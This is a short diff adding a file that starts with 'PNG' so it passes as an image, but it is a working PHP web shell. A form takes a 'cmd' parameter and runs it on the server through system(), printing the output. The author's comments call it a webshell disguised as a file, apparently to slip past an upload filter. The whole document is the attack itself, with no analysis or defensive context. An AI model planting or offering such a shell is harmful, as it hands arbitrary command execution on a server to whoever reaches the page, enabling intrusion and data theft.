@@ -1,0 +1,19 @@
+PNG
+<!-- this is a php webshell, solved by disguising this form as a file-->
+<!-- TODO: find out how to send this request as a file with curl -->
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
